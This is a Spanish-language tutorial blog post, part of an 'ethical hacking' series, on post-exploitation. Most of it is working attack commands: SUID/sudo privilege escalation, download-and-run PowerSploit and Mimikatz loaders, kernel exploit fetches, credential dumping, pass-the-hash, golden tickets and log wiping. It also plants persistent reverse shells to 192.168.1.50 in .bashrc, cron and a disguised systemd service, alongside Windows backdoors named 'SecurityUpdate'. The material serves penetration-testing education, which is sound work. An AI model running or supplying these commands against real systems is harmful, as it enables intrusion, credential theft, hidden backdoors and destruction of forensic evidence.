---
title: "Hacking Ético desde 0 - Parte 7: Post-Explotación y Persistencia"
date: 2025-09-15 10:00:00 +0100
categories: [Hacking Ético, Ciberseguridad]
tags: [hacking-etico, pentesting, post-explotacion, persistencia, escalada-privilegios, lateral-movement]
image:
  path: /assets/img/hacking-etico/post-explotacion.jpg
  alt: "Post-Explotación y Persistencia en Hacking Ético"
---

## 🎯 Introducción

¡Bienvenidos a la **séptima entrega** de "Hacking Ético desde 0"! Tras dominar la explotación inicial, es momento de abordar lo que muchos consideran la fase más crítica: **la post-explotación**.

En esta fase es donde realmente se demuestra el impacto de un compromiso exitoso. Aprenderemos técnicas de escalada de privilegios, movimiento lateral, persistencia y extracción de datos.

⚠️ **ADVERTENCIA ÉTICA**: Este contenido es exclusivamente para propósitos educativos y pruebas autorizadas.

## 🔍 ¿Qué es la Post-Explotación?

La **post-explotación** comprende todas las actividades realizadas después de obtener acceso inicial a un sistema. Sus objetivos son:

### Objetivos Principales:
- **Escalada de privilegios** - Obtener mayor acceso
- **Persistencia** - Mantener acceso a largo plazo
- **Movimiento lateral** - Acceder a otros sistemas
- **Recolección de información** - Extraer datos valiosos
- **Covering tracks** - Ocultar evidencia de actividad

## 🚀 Escalada de Privilegios en Linux

### 1. Enumeración del Sistema

```bash
#!/bin/bash
# linux_enum.sh - Script de enumeración para escalada de privilegios

echo "=== ENUMERACIÓN DEL SISTEMA ==="

# Información básica del sistema
echo "[+] Información del sistema:"
uname -a
cat /etc/os-release
whoami
id

# Usuarios y grupos
echo "[+] Usuarios del sistema:"
cat /etc/passwd | grep -v nologin | grep -v false
cat /etc/group

# Procesos en ejecución
echo "[+] Procesos con privilegios:"
ps aux | grep root

# Servicios en ejecución
echo "[+] Servicios activos:"
systemctl list-units --type=service --state=active

# Archivos con permisos SUID/SGID
echo "[+] Binarios SUID/SGID:"
find / -perm -4000 -type f 2>/dev/null
find / -perm -2000 -type f 2>/dev/null

# Capacidades especiales
echo "[+] Capacidades de archivos:"
getcap -r / 2>/dev/null

# Sudo permissions
echo "[+] Permisos sudo:"
sudo -l 2>/dev/null

# Cron jobs
echo "[+] Tareas programadas:"
cat /etc/crontab 2>/dev/null
ls -la /etc/cron* 2>/dev/null
crontab -l 2>/dev/null

# Variables de entorno
echo "[+] Variables de entorno:"
env | grep -i path

# Archivos escribibles en PATH
echo "[+] Archivos escribibles en PATH:"
echo $PATH | tr ":" "\n" | xargs -I {} find {} -writable 2>/dev/null

# Historial de comandos
echo "[+] Historial de comandos:"
cat ~/.bash_history 2>/dev/null | head -20
```

### 2. Explotación de Binarios SUID

```bash
# Buscar binarios SUID vulnerables
find / -perm -4000 -type f 2>/dev/null

# Ejemplos comunes de escalada:

# 1. /bin/cp con SUID
echo 'user1 ALL=(ALL) NOPASSWD:ALL' > /tmp/sudoers
/bin/cp /tmp/sudoers /etc/sudoers

# 2. /usr/bin/find con SUID
/usr/bin/find /home -exec "/bin/sh" \;

# 3. /usr/bin/vim con SUID
/usr/bin/vim -c ':!/bin/sh'

# 4. /bin/more con SUID
/bin/more /etc/passwd
!/bin/sh

# 5. /usr/bin/awk con SUID
/usr/bin/awk 'BEGIN {system("/bin/sh")}'
```

### 3. Explotación de Sudo

```bash
# Verificar permisos sudo
sudo -l

# Ejemplos de escalada con sudo:

# 1. Sudo sin password en comando específico
sudo /usr/bin/vim /etc/hosts
# Dentro de vim: :!/bin/bash

# 2. Sudo con comodines
sudo /bin/cp /home/user/* /root/
# Crear symlink: ln -s /etc/passwd /home/user/passwd

# 3. Variables de entorno en sudo
sudo LD_PRELOAD=./shell.so /usr/bin/apache2

# 4. Script personalizado con sudo
echo '#!/bin/bash\n/bin/bash' > /tmp/script.sh
chmod +x /tmp/script.sh
sudo /tmp/script.sh
```

### 4. Kernel Exploits

```bash
# Identificar versión del kernel
uname -r
cat /proc/version

# Buscar exploits conocidos
searchsploit linux kernel 4.15.0
searchsploit ubuntu 18.04

# Ejemplos de exploits comunes:
# CVE-2021-4034 (PwnKit)
wget https://github.com/arthepsy/CVE-2021-4034/raw/main/cve-2021-4034-poc.c
gcc cve-2021-4034-poc.c -o exploit
./exploit

# CVE-2017-16995 (Ubuntu 16.04)
wget https://www.exploit-db.com/raw/45010 -O 45010.c
gcc 45010.c -o exploit
./exploit
```

## 💻 Escalada de Privilegios en Windows

### 1. Enumeración de Windows

```powershell
# windows_enum.ps1 - Script de enumeración para Windows

# Información del sistema
systeminfo
whoami /all
net user
net localgroup administrators

# Procesos y servicios
tasklist /fo table
sc query state= all

# Permisos de archivos y directorios
icacls "C:\Program Files"
accesschk.exe -uwcqv "Authenticated Users" *

# Variables de entorno
set

# Servicios vulnerables
sc query state= all | findstr "SERVICE_NAME"
for /f "tokens=2 delims= " %i in ('sc query state^= all ^| findstr "SERVICE_NAME"') do @echo %i & sc qc %i | findstr "BINARY_PATH_NAME"

# Programas instalados
wmic product get name,version
dir "C:\Program Files"
dir "C:\Program Files (x86)"

# Tareas programadas
schtasks /query /fo table /v

# Registro de Windows
reg query HKLM /f password /t REG_SZ /s
reg query HKCU /f password /t REG_SZ /s
```

### 2. PowerSploit y PowerShell

```powershell
# Descargar PowerSploit
IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1')

# Ejecutar PowerUp
Invoke-AllChecks

# Buscar credenciales en memoria
IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1')
Invoke-Mimikatz -DumpCreds

# Token impersonation
IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/Get-System.ps1')
Get-System
```

### 3. Explotación de Servicios Windows

```bash
# Meterpreter commands para Windows
getsystem
getprivs
run post/windows/gather/enum_services

# Migrar a proceso con más privilegios
ps
migrate <PID>

# Cargar módulos adicionales
load kiwi
creds_all
```

## 🌐 Movimiento Lateral

### 1. Enumeración de Red Interna

```bash
# Descubrir hosts en red interna
nmap -sn 192.168.1.0/24
arp -a
netstat -rn

# Escaneo de puertos internos
nmap -sS -T4 --top-ports 1000 192.168.1.0/24

# Enumeración SMB
enum4linux 192.168.1.100
smbclient -L //192.168.1.100
```

### 2. Pass-the-Hash Attacks

```bash
# Con Metasploit
use exploit/windows/smb/psexec
set RHOSTS 192.168.1.100
set SMBUser administrator
set SMBPass aad3b435b51404eeaad3b435b51404ee:5fbc3d5fec8206a30f4b6c473d68ae76
exploit

# Con Impacket
python3 psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:5fbc3d5fec8206a30f4b6c473d68ae76 administrator@192.168.1.100

# Con CrackMapExec
crackmapexec smb 192.168.1.0/24 -u administrator -H 5fbc3d5fec8206a30f4b6c473d68ae76
```

### 3. Golden Ticket Attack

```powershell
# Obtener información del dominio
nltest /domain_trusts
net time /domain

# Crear Golden Ticket con Mimikatz
mimikatz.exe "kerberos::golden /user:administrator /domain:company.local /sid:S-1-5-21-1234567890-1234567890-1234567890 /krbtgt:1234567890abcdef1234567890abcdef /ptt"
```

## 🔒 Técnicas de Persistencia

### 1. Persistencia en Linux

```bash
# 1. Backdoor en ~/.bashrc
echo 'bash -i >& /dev/tcp/192.168.1.50/4444 0>&1' >> ~/.bashrc

# 2. Cron job
echo '*/5 * * * * /bin/bash -c "bash -i >& /dev/tcp/192.168.1.50/4444 0>&1"' | crontab -

# 3. Servicio systemd
cat > /etc/systemd/system/backdoor.service << EOF
[Unit]
Description=System Backup Service
After=network.target

[Service]
Type=simple
ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/192.168.1.50/4444 0>&1'
Restart=always
User=root

[Install]
WantedBy=multi-user.target
EOF

systemctl enable backdoor.service
systemctl start backdoor.service

# 4. SSH key backdoor
mkdir -p ~/.ssh
echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAAB...' >> ~/.ssh/authorized_keys
chmod 600 ~/.ssh/authorized_keys

# 5. Setuid backdoor
cp /bin/bash /tmp/.backdoor
chmod 4755 /tmp/.backdoor
```

### 2. Persistencia en Windows

```powershell
# 1. Registry Run key
reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v "SecurityUpdate" /t REG_SZ /d "C:\Windows\Temp\backdoor.exe"

# 2. Scheduled Task
schtasks /create /tn "SecurityUpdate" /tr "C:\Windows\Temp\backdoor.exe" /sc onlogon

# 3. Service creation
sc create "SecurityService" binpath= "C:\Windows\Temp\backdoor.exe" start= auto
sc start SecurityService

# 4. WMI Event Subscription
$filter = Set-WmiInstance -Class __EventFilter -Namespace "root\subscription" -Arguments @{Name="SecurityFilter";EventNameSpace="root\cimv2";QueryLanguage="WQL";Query="SELECT * FROM Win32_VolumeChangeEvent WHERE EventType = 2"}

$consumer = Set-WmiInstance -Class CommandLineEventConsumer -Namespace "root\subscription" -Arguments @{Name="SecurityConsumer";CommandLineTemplate="C:\Windows\Temp\backdoor.exe"}

Set-WmiInstance -Class __FilterToConsumerBinding -Namespace "root\subscription" -Arguments @{Filter=$filter;Consumer=$consumer}

# 5. DLL Hijacking
copy backdoor.dll "C:\Program Files\Application\hijackable.dll"
```

### 3. Meterpreter Persistence

```bash
# Meterpreter persistence modules
run persistence -S -U -X -i 60 -p 4445 -r 192.168.1.50

# Manual persistence
upload backdoor.exe C:\\Windows\\Temp\\backdoor.exe
run persistence -S -X -i 60 -p 4445 -r 192.168.1.50 -A -L c:\\
```

## 📊 Recolección de Información Sensible

### 1. Credenciales y Hashes

```bash
# Linux - Archivos de contraseñas
cat /etc/passwd
cat /etc/shadow (requiere root)

# Buscar archivos con credenciales
grep -r "password" /home/ 2>/dev/null
grep -r "username" /var/log/ 2>/dev/null
find / -name "*.config" -exec grep -l "password" {} \; 2>/dev/null

# Historial de comandos
cat ~/.bash_history
cat ~/.mysql_history
cat ~/.ssh/known_hosts

# Windows - SAM y SYSTEM
reg save HKLM\SYSTEM C:\Windows\Temp\system.hiv
reg save HKLM\SAM C:\Windows\Temp\sam.hiv

# Mimikatz para extraer credenciales
mimikatz.exe "sekurlsa::logonpasswords"
mimikatz.exe "lsadump::sam"
```

### 2. Archivos y Datos Sensibles

```bash
# Script de búsqueda de archivos sensibles
#!/bin/bash
# sensitive_files.sh

echo "[+] Buscando archivos sensibles..."

# Documentos comunes
find / -name "*.doc" -o -name "*.docx" -o -name "*.pdf" -o -name "*.txt" 2>/dev/null | head -20

# Archivos de configuración
find / -name "*.conf" -o -name "*.config" -o -name "*.cfg" 2>/dev/null | head -20

# Bases de datos
find / -name "*.db" -o -name "*.sqlite" -o -name "*.sql" 2>/dev/null

# Llaves SSH
find / -name "id_rsa" -o -name "id_dsa" -o -name "*.pem" 2>/dev/null

# Archivos de backup
find / -name "*.bak" -o -name "*.backup" -o -name "*~" 2>/dev/null | head -20

# Logs del sistema
ls -la /var/log/
tail /var/log/auth.log
tail /var/log/apache2/access.log
```

### 3. Información de Red y Sistema

```python
#!/usr/bin/env python3
# network_info.py - Recolector de información de red

import subprocess
import socket
import json

def get_network_info():
    """Recolectar información de red"""
    info = {}
    
    # Interfaces de red
    try:
        result = subprocess.run(['ip', 'addr'], capture_output=True, text=True)
        info['interfaces'] = result.stdout
    except:
        pass
    
    # Tabla de rutas
    try:
        result = subprocess.run(['ip', 'route'], capture_output=True, text=True)
        info['routes'] = result.stdout
    except:
        pass
    
    # ARP table
    try:
        result = subprocess.run(['arp', '-a'], capture_output=True, text=True)
        info['arp_table'] = result.stdout
    except:
        pass
    
    # Conexiones activas
    try:
        result = subprocess.run(['netstat', '-tuln'], capture_output=True, text=True)
        info['connections'] = result.stdout
    except:
        pass
    
    return info

def save_info(info, filename='network_info.json'):
    """Guardar información en archivo"""
    with open(filename, 'w') as f:
        json.dump(info, f, indent=2)
    print(f"[+] Información guardada en {filename}")

if __name__ == "__main__":
    network_info = get_network_info()
    save_info(network_info)
```

## 🕳️ Covering Tracks

### 1. Limpieza de Logs

```bash
# Linux - Limpiar logs comunes
echo "" > /var/log/auth.log
echo "" > /var/log/syslog
echo "" > /var/log/wtmp
echo "" > /var/log/lastlog

# Eliminar entradas específicas
sed -i '/192.168.1.50/d' /var/log/auth.log

# Limpiar historial de comandos
history -c
echo "" > ~/.bash_history
unset HISTFILE

# Windows - Limpiar Event Logs
wevtutil cl Application
wevtutil cl System
wevtutil cl Security

# Limpiar logs específicos
for /f %i in ('wevtutil el') do wevtutil cl "%i"
```

### 2. Modificar Timestamps

```bash
# Linux - Modificar timestamps
touch -d "2024-01-01 12:00:00" /path/to/file
touch -r /etc/passwd /path/to/backdoor

# Script para preservar timestamps
#!/bin/bash
# preserve_timestamps.sh

FILE=$1
TIMESTAMP=$(stat -c %Y $FILE)

# Hacer modificaciones al archivo aquí
echo "backdoor" >> $FILE

# Restaurar timestamp
touch -d @$TIMESTAMP $FILE
```

### 3. Herramientas Anti-Forenses

```python
#!/usr/bin/env python3
# antiforensics.py - Herramientas anti-forenses básicas

import os
import time
import random
import hashlib

def secure_delete(filepath, passes=3):
    """Eliminación segura de archivos"""
    if not os.path.exists(filepath):
        return
    
    filesize = os.path.getsize(filepath)
    
    with open(filepath, "r+b") as f:
        for _ in range(passes):
            f.seek(0)
            f.write(os.urandom(filesize))
            f.flush()
            os.fsync(f.fileno())
    
    os.remove(filepath)
    print(f"[+] Archivo {filepath} eliminado de forma segura")

def modify_file_metadata(filepath, ref_file):
    """Modificar metadatos para matching reference"""
    if os.path.exists(ref_file):
        stat = os.stat(ref_file)
        os.utime(filepath, (stat.st_atime, stat.st_mtime))
        print(f"[+] Metadatos de {filepath} modificados")

def create_decoy_files(directory, count=10):
    """Crear archivos señuelo"""
    for i in range(count):
        filename = f"temp_{random.randint(1000,9999)}.tmp"
        filepath = os.path.join(directory, filename)
        
        with open(filepath, 'w') as f:
            f.write(os.urandom(random.randint(100, 1000)).hex())
        
        # Timestamp aleatorio
        random_time = time.time() - random.randint(86400, 2592000)
        os.utime(filepath, (random_time, random_time))
    
    print(f"[+] {count} archivos señuelo creados en {directory}")

if __name__ == "__main__":
    # Ejemplo de uso
    # secure_delete("/tmp/backdoor.txt")
    # modify_file_metadata("/tmp/backdoor", "/bin/ls")
    # create_decoy_files("/tmp/", 15)
    pass
```

## 🧪 Laboratorio Completo de Post-Explotación

### Ejercicio: Metasploitable 2 - Post-Explotación Completa

```bash
# 1. Obtener acceso inicial
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOSTS <METASPLOITABLE_IP>
exploit

# 2. Escalada de privilegios
find / -perm -4000 2>/dev/null
/usr/bin/nmap --interactive
!sh

# 3. Establecer persistencia
echo 'bash -i >& /dev/tcp/192.168.1.50/4444 0>&1' >> /root/.bashrc
crontab -e
# Agregar: */10 * * * * /bin/bash -c 'bash -i >& /dev/tcp/192.168.1.50/4444 0>&1'

# 4. Recolección de información
cat /etc/passwd
cat /etc/shadow
find /home -name "*.txt" -exec cat {} \;

# 5. Movimiento lateral
nmap -sn 192.168.1.0/24
smbclient -L //192.168.1.1

# 6. Covering tracks
history -c
echo "" > ~/.bash_history
sed -i '/192.168.1.50/d' /var/log/auth.log
```

## 📈 Mejores Prácticas de Post-Explotación

### 1. Metodología Sistemática

```markdown
## Checklist de Post-Explotación

### Fase 1: Establecimiento (0-30 min)
- [ ] Verificar acceso obtenido
- [ ] Identificar nivel de privilegios
- [ ] Establecer comunicación estable
- [ ] Crear backup de acceso inicial

### Fase 2: Enumeración (30-60 min)
- [ ] Enumerar sistema operativo y versión
- [ ] Identificar usuarios y grupos
- [ ] Mapear servicios en ejecución
- [ ] Buscar archivos de configuración
- [ ] Identificar software instalado

### Fase 3: Escalada (60-120 min)
- [ ] Buscar vulnerabilidades de escalada
- [ ] Intentar explotación de SUID/sudo
- [ ] Probar kernel exploits
- [ ] Verificar configuraciones débiles

### Fase 4: Persistencia (30-60 min)
- [ ] Establecer múltiples métodos de acceso
- [ ] Configurar backdoors
- [ ] Crear cuentas de usuario
- [ ] Programar tareas automáticas

### Fase 5: Expansión (60-180 min)
- [ ] Enumerar red interna
- [ ] Identificar targets adicionales
- [ ] Realizar movimiento lateral
- [ ] Comprometer sistemas adicionales

### Fase 6: Recolección (30-120 min)
- [ ] Buscar archivos sensibles
- [ ] Extraer credenciales
- [ ] Capturar tráfico de red
- [ ] Documentar hallazgos

### Fase 7: Limpieza (15-30 min)
- [ ] Limpiar logs de actividad
- [ ] Eliminar herramientas cargadas
- [ ] Restaurar configuraciones
- [ ] Verificar que no queden rastros
```

### 2. Consideraciones Éticas

- **Minimizar impacto** en sistemas de producción
- **Documentar** todas las actividades
- **Respetar** el alcance del engagement
- **Proteger** información sensible encontrada
- **Limpiar** adecuadamente al finalizar

## 🎯 Próximos Pasos

En el **próximo tutorial** finalizaremos la serie con:

1. **Hacking de Aplicaciones Web Avanzado**
2. **Reporting y Documentación Profesional**
3. **Metodologías de Testing (OWASP, NIST)**
4. **Casos de Estudio Reales**
5. **Preparación para Certificaciones**

## 📚 Recursos Adicionales

- [PTES (Penetration Testing Execution Standard)](http://www.pentest-standard.org/)
- [NIST SP 800-115](https://nvlpubs.nist.gov/nistpubs/Legacy/SP/nistspecialpublication800-115.pdf)
- [OWASP Testing Guide](https://owasp.org/www-project-web-security-testing-guide/)
- [GTFOBins](https://gtfobins.github.io/)
- [LOLBAS (Living Off The Land Binaries)](https://lolbas-project.github.io/)

## 🎓 Conclusión

La post-explotación es donde se demuestra el verdadero impacto de una vulnerabilidad. Las técnicas cubiertas en este tutorial representan lo que un atacante real podría hacer una vez dentro de un sistema.

**Puntos clave para recordar**:

1. **La escalada de privilegios** es crítica para el control total
2. **La persistencia** permite acceso a largo plazo
3. **El movimiento lateral** amplifica el impacto
4. **La recolección de datos** determina el daño real
5. **Covering tracks** es esencial para evitar detección

Como pentesters éticos, nuestro objetivo es **demostrar estos riesgos de manera responsable** para que las organizaciones puedan fortalecer sus defensas.

En la próxima y última entrega de la serie, consolidaremos todo lo aprendido con casos prácticos avanzados y te prepararemos para aplicar estos conocimientos en el mundo real.

---

**Andrés Nuñez - t4ifi**
